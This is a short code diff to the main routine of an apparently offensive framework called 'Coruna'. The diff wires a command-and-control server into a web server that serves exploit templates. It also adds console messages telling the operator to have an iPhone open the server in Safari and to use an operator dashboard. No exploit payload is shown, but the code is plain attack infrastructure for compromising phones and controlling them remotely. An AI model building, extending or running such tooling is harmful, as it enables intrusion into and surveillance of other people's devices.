@@ -28,12 +28,16 @@ async def main():
     web_port = config.get("web_server_port", 80)
     exploits_dir = config.get("exploit_templates_dir", "exploits")
     static_dir = config.get("static_files_dir", "web_server/static")
-    web_server = ExploiterWebServer(web_ip, web_port, exploits_dir, static_dir)
+    web_server = ExploiterWebServer(
+        web_ip, web_port, exploits_dir, static_dir, c2_server=c2_server
+    )
 
-    await web_server.start(config)
+    await web_server.start(config, c2_server=c2_server)
     c2_task = asyncio.create_task(c2_server.start())
 
-    print("\n[*] Coruna running. Open http://<SERVER_IP>/ in Safari on your iPhone")
+    port_suffix = "" if web_port == 80 else f":{web_port}"
+    print(f"\n[*] Coruna running. Open http://<SERVER_IP>{port_suffix}/ in Safari on your iPhone")
+    print(f"[*] Operator Dashboard UI: http://127.0.0.1{port_suffix}/ui")
     print("[*] Commands: list | use <id> | help | quit\n")
 
     shutdown_event = asyncio.Event()
